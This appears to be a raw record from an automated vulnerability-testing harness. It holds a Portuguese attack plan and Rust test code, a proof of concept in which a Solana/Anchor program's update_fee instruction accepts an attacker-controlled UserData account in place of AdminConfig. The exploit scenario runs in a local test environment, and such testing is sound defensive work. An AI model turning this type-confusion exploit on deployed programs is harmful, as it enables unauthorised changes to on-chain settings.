attempts.raw:
{
  "plan": "Preparamos uma conta UserData cujo campo authority (bytes 8..40) é a pubkey do atacante, e uma conta AdminConfig legítima cujo admin é uma pubkey diferente. O baseline chama update_fee com a AdminConfig legítima e o signer admin correto, provando que o cenário está montado. O ataque chama update_fee passando a conta UserData no lugar de AdminConfig, assinada pelo atacante (que é o authority da UserData). O efeito mede se os bytes 40..48 da UserData foram sobrescritos com o novo fee, demonstrando que uma conta de outro tipo foi aceita como AdminConfig.",
  "scenario": "let attacker = Pubkey::new_unique();
let legit_admin = Pubkey::new_unique();

let user_data = account(
    &env.program_id,
    &anchor_account_data("UserData", &(attacker, 0u64)),
    None,
);
let admin_config = account(
    &env.program_id,
    &anchor_account_data("AdminConfig", &(legit_admin, 100u64)),
    None,
);

let new_fee: u64 = 9999;

let baseline_ix = env.anchor_ix(
    "update_fee",
    &new_fee,
    vec![
        AccountMeta::new(admin_config_key, false),
        AccountMeta::new_readonly(legit_admin, true),
    ],
);
let baseline_accounts = vec![
    (admin_config_key, admin_config.clone()),
    (legit_admin, wallet(1_000_000_000)),
];
let baseline = env.baseline("update_fee legitimo com AdminConfig", &baseline_ix, &baseline_accounts);

let attack_ix = env.anchor_ix(
    "update_fee",
    &new_fee,
    vec![
        AccountMeta::new(user_data_key, false),
        AccountMeta::new_readonly(attacker, true),
    ],
);
let attack_accounts = vec![
    (user_data_key, user_data.clone()),
    (attacker, wallet(1_000_000_000)),
];
let r = env.attack("update_fee com UserData no lugar de AdminConfig", &attack_ix, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &user_data_key).data();
    env.effect(
        "fee da UserData sobrescrito (conta de outro tipo aceita como AdminConfig)",
        read_u64(data, 40) == new_fee,
    );
}"
}

